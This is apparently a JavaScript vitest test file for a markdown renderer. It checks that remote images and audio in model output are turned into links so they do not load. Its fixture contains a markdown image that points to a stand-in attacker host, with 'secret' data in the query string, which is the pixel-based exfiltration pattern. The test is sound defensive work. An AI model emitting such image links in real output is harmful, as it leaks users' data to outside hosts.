import { describe, it, expect } from 'vitest';
import { renderBlocksInline, renderBlocksInlineWithContext } from '../../src/markdown.js';

const md = 'Summary\n\n![chart](https://evil.example/pixel.png?d=secret)\n\n![song](https://evil.example/a.mp3)';

function parse(html) {
  const host = document.createElement('div');
  host.innerHTML = html;
  return host;
}

describe('remote media in model output', () => {
  it('renders external images and audio as links, not as loading elements', () => {
    const host = parse(renderBlocksInlineWithContext(md, { remoteMedia: 'link' }));

    expect(host.querySelector('img')).toBeNull();
    expect(host.querySelector('audio')).toBeNull();

    const links = [...host.querySelectorAll('a.pv-remote-media')];
    expect(links.map((a) => a.getAttribute('href'))).toEqual([
      'https://evil.example/pixel.png?d=secret',
      'https://evil.example/a.mp3',
    ]);
  });

  it('leaves normal note rendering unchanged', () => {
    const host = parse(renderBlocksInline(md));
    expect(host.querySelector('img')?.getAttribute('src')).toBe('https://evil.example/pixel.png?d=secret');
  });
});
